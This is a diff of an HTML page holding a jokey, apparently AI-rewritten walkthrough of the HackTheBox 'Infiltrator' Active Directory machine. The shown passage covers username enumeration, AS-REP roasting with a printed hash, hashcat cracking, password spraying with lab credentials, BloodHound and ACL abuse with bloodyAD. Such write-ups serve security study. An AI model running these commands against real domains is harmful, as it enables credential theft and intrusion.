@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="color-scheme" content="light dark">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.6.0.839578655806">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.6.0.839691610260">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 4.6.0">
@@ -46,12 +46,12 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=4.6.0.839578655806" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=4.6.0.839691610260" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=4.6.0.839578655806" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=4.6.0.839691610260" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=4.6.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=4.6.0.839578655806" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=4.6.0.839578655806" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=4.6.0.839691610260" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=4.6.0.839691610260" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -178,8 +178,25 @@
 </div>
 
 <p>Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn&#x27;t have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user <code translate="no" v-pre>M.harris</code>. Once on the machine, the attacker can identify that the whole company communicates through the <code translate="no" v-pre>Output Messenger</code> application. Infiltrating the application, switching users, reverse engineering a binary, and using the application&#x27;s API, he can eventually land a shell as the user <code translate="no" v-pre>O.martinez</code> on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an <code translate="no" v-pre>ntds.dit</code> file from which he can read sensitive user information and find a valid password for the user <code translate="no" v-pre>lan_managment</code>. This new user can read the GMSA password of the user <code translate="no" v-pre>infiltrator_svc$</code>. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator&#x27;s hash and compromise the whole domain through the certificate exploitation.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-warning"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-warning" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M22.48 15.59L14.01 1.45A2.968 2.968 0 0012.16.09c-.78-.19-1.58-.07-2.27.35-.41.25-.76.6-1.01 1.01v.01L.4 15.6c-.83 1.43-.33 3.27 1.1 4.1.45.26.95.4 1.48.4h16.95c.8-.01 1.55-.33 2.11-.9.56-.57.87-1.33.86-2.13a3.04 3.04 0 00-.42-1.48zm-1.87 2.21c-.19.19-.44.3-.69.3H2.99c-.17 0-.34-.05-.49-.13a.992.992 0 01-.37-1.35L10.6 2.48c.08-.14.2-.25.34-.33a.992.992 0 011.37.33l8.46 14.13c.09.15.13.32.13.49 0 .26-.1.51-.29.7z"></path>
+                    <path d="M11.45 12.1c.55 0 1-.45 1-1v-4c0-.55-.45-1-1-1s-1 .45-1 1v4c0 .56.45 1 1 1zM11.46 14.1c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>DISCLAIMER</h5>
+<p>This writeup has been rewritten by AI and contains traces of Gen Z humor. For the uninitiated: this is a shitpost with substance. Read at your own risk.</p>
+        </div>
+    </div>
+</div>
 <h1 id="enumeration">Enumeration</h1>
-<p>I ain’t wastin&#x27; time with your granddaddy’s nmap scan — nah, we already know this box be bustin’ that Active Directory life, so we skip the foreplay and go raw into <strong>user enumeration</strong>. First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin&#x27;).</p>
+<p>I ain&#x27;t wastin&#x27; time with your granddaddy’s nmap scan. Nah, we already know this box be bustin&#x27; that Active Directory life, so we skip the foreplay and go raw into <strong>user enumeration</strong>. First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin&#x27;).</p>
 <div id="enumeration-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-none"><code v-pre class="language-none">David Anderson
 Olivia Martinez
@@ -189,9 +206,9 @@ Marcus Harris
 Lauren Clark
 Ethan Rodriguez</code></pre>
 </doc-codeblock></div>
-<p>Now we feed these names into <code translate="no" v-pre>UsernameAnarchy</code> — a beautiful little gremlin of a tool that chews on names and vomits out 6,000 permutations of corporate identity theft.</p>
+<p>Now we feed these names into <code translate="no" v-pre>UsernameAnarchy</code>, a beautiful little gremlin of a tool that chews on names and vomits out 6000 permutations of corporate identity theft.</p>
 <div id="enumeration-code-2" class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ /username-anarchy/username-anarchy --input-file users.txt &gt; probably_usernames.txt</code></pre>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ username-anarchy --input-file users.txt &gt; probably_usernames.txt</code></pre>
 </doc-codeblock></div>
 <p>And just like that, we got a whole buffet of usernames. Next up: <strong>Kerbrute</strong>, because what’s more fun than whispering sweet nothings to Kerberos and seeing who moans back?</p>
 <div id="enumeration-code-3" class="codeblock-wrapper"><doc-codeblock>
@@ -226,7 +243,7 @@ m.harris@INFILTRATOR.HTB
 e.rodriguez@INFILTRATOR.HTB
 l.clark@INFILTRATOR.HTB</code></pre>
 </doc-codeblock></div>
-<p>Time to get greasy with <strong>ASREPRoasting</strong>. We send a lil’ love letter to the domain like “hey, gimme them sweet sweet hashies” — and boom, one account responds like “sure babe, no pre-auth needed!”. Yessir!</p>
+<p>Time to get greasy with <strong>ASREPRoasting</strong>. We send a lil’ love letter to the domain like <em>&quot;hey, gimme them sweet sweet hashies&quot;</em>, and boom, one account responds like <em>&quot;sure babe, no pre-auth needed!&quot;</em>. Yessir!</p>
 <div id="enumeration-code-5" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ GetNPUsers.py INFILTRATOR.HTB/ -dc-ip 10.10.11.31 -no-pass -usersfile all_ad_users -format hashcat
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -240,17 +257,17 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [-] User e.rodriguez@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
 $krb5asrep$23$l.clark@INFILTRATOR.HTB@INFILTRATOR.HTB:96becffa85728f8fea33be18e9ca6164$bb2614f154c83cbcd98e1f110566be9d1ea1bd44eb7041f119b22b73bbb82175e9e7b309f518c4dab0469efcb47e15a332caf0e00f82a55ad45afed64a8b923afc1f832664f1f6eba19414e6b706933d3c27a656688f59e748ba7ca64e68647bbf113d67afe8d39d39db2ae9f8bb28383bc42f48a22969d34a21599c40d1bd240a92185222100a9787ddaaa78660197a21affdccb023e9114b51797693a6a37cfc72ac9dc300b08f9bc89a9d64c522c00a3262d67b54f34d24efdb74ad9bceae2cbaa2631c4d595162f46a7c0dcbc8607e77c71986e2a435def66cfd5a3de16aee5074dfdba977dd8d037083c189d523862e</code></pre>
 </doc-codeblock></div>
-<p>Turns out our girl <strong>l.clark</strong> out here just raw-dogging Kerberos with no protection. Naturally, we hit her with the ol’ <strong>hashcat special</strong>:</p>
+<p>Turns out our girl <strong>l.clark</strong> out here just raw-dogging Kerberos with no protection. Naturally, we hit her with the ol&#x27; <strong>hashcat special</strong>:</p>
 <div id="enumeration-code-6" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 18200 lclark.hash $ROCKYOU</code></pre>
 </doc-codeblock></div>
-<p>This hash be cracking faster than a microwave burrito — and what do we get? That’s right, keys to the kingdom. VIP access. L.clark got us in the door, and now we’re poking around like we own the place.</p>
+<p>This hash be cracking faster than a microwave burrito. And what do we get? That’s right, keys to the kingdom. VIP access. L.clark got us in the door, and now we’re poking around like we own the place.</p>
 <div id="enumeration-code-7" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' --users
 SMB         10.10.11.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.31   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!</code></pre>
 </doc-codeblock></div>
-<p>With these creds on our hands, we blast <code translate="no" v-pre>nxc smb</code> again and go full snoop-mode on the domain — enumerate all the users like it’s roll call at hacker high school. We also run a cheeky lil&#x27; SID lookup:</p>
+<p>With these creds on our hands, we blast <code translate="no" v-pre>nxc smb</code> again and go full snoop-mode on the domain. Enumerate all the users like it&#x27;s roll call at hacker high school. We also run a cheeky lil&#x27; SID lookup:</p>
 <div id="enumeration-code-8" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ lookupsid.py l.clark@INFILTRATOR.HTB | grep SidTypeUser
 Password: WAT?watismypass!
@@ -268,14 +285,14 @@ Password: WAT?watismypass!
 1601: INFILTRATOR\winrm_svc (SidTypeUser)
 3102: INFILTRATOR\infiltrator_svc$ (SidTypeUser)</code></pre>
 </doc-codeblock></div>
-<p>We flex for a <strong>Kerberoasting</strong> round just in case someone slipped, but nah, nothing juicy. No tickets, no service accounts, just disappointment. But hold up — plot twist. Our recon pulls up a lil’ easter egg: <strong>user k.turner</strong> has a password just chillin’ in their description field. Man’s out here treating Active Directory like a Post-it note.</p>
+<p>We flex for a <strong>Kerberoasting</strong> round just in case someone slipped, but nah, nothing juicy. No tickets, no service accounts, just disappointment. But hold up, plot twist. Our recon pulls up a lil&#x27; easter egg: <strong>user k.turner</strong> has a password just chillin’ in their description field. Man’s out here treating Active Directory like a Post-it note.</p>
 <div id="enumeration-code-9" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' --users | grep K.turner
 SMB                      10.10.11.31   445    DC01             K.turner                      2024-02-25 15:40:35 1       MessengerApp@Pass!</code></pre>
 </doc-codeblock></div>
 <p>So we take this blessed gift from k.turner’s description field and we <strong>yeet</strong> it into a password spray like we’re Oprah handing out creds:</p>
 <blockquote>
-<p><em>“You get a login! YOU get a login! ERRBODY LOGGING IN!”</em></p>
+<p>&quot;You get a login! YOU get a login! ERRBODY LOGGING IN!&quot;</p>
 </blockquote>
 <div id="enumeration-code-10" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.infiltrator.htb -u users.txt -p 'MessengerApp@Pass!' --continue-on-success
@@ -285,10 +302,10 @@ SMB         10.10.11.31   445    DC01             [-] infiltrator.htb\d.anderson
 </doc-codeblock></div>
 <p>But then... Curveball. We see that both <code translate="no" v-pre>m.harris</code> and <code translate="no" v-pre>d.anderson</code> get the message <code translate="no" v-pre>STATUS_ACCOUNT_RESTRICTION</code>. Excuse me??? Microsoft really out here like:</p>
 <blockquote>
-<p>“Woah woah woah, hold up... you <em>do</em> have the right password, but uhh... no entry. Try again when your chakras are aligned or whatever.”</p>
+<p>&quot;Woah woah woah, hold up... you <em>do</em> have the right password, but uhh... no entry. Try again when your chakras are aligned or whatever.&quot;</p>
 </blockquote>
-<p>This ain&#x27;t a wrong password, nah. This is <strong>“you got it, but you still ain&#x27;t allowed.”</strong> That’s the cyber equivalent of your key working in the lock but some dude inside just holding the door shut whispering, <em>“not today, boi.”</em></p>
-<p>So yeah — creds probably valid, but maybe they’re disabled, locked out, got logon restrictions, or just spiritually unavailable. Either way, these accounts are on some <span class="docs-emoji">&#x2728;</span>emotional boundary<span class="docs-emoji">&#x2728;</span> arc and we gotta pivot.</p>
+<p>This ain&#x27;t necessarily a wrong password, nah. This is <strong>“you might got it, but you still ain&#x27;t allowed.”</strong> That’s the cyber equivalent of your key working in the lock but some dude inside just holding the door shut whispering, <em>&quot;not today, boi.&quot;</em></p>
+<p>So yeah, creds probably valid, but maybe they’re disabled, locked out, got logon restrictions, or just spiritually unavailable. Either way, these accounts are on some <span class="docs-emoji">&#x2728;</span>emotional boundary<span class="docs-emoji">&#x2728;</span> arc and we gotta pivot.</p>
 <h2 id="bloodhound">Bloodhound</h2>
 <p>So now that we got creds for <code translate="no" v-pre>l.clark</code> (shoutout to my boy k.turner), we unleash <strong>BloodHound</strong> to sniff out the domain like a digital truffle pig.</p>
 <div id="bloodhound-code-1" class="codeblock-wrapper"><doc-codeblock>
@@ -314,7 +331,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 </figure>
 <p>Okay now we’re cooking. You know what that means? We can start <strong>yeeting ACLs</strong> around ike we’re modding the Minecraft server at 3AM.</p>
 <blockquote>
-<p>“You get admin perms, you get admin perms—oh look, the economy’s ruined!”</p>
+<p>“You get admin perms, you get admin perms. Oh look, the economy’s ruined!”</p>
 </blockquote>
 <p>So we bless our old pal <code translate="no" v-pre>l.clark</code> with <strong>GenericAll</strong> over the entire OU using <code translate="no" v-pre>bloodyAD</code>:</p>
 <div id="bloodhound-code-4" class="codeblock-wrapper"><doc-codeblock>
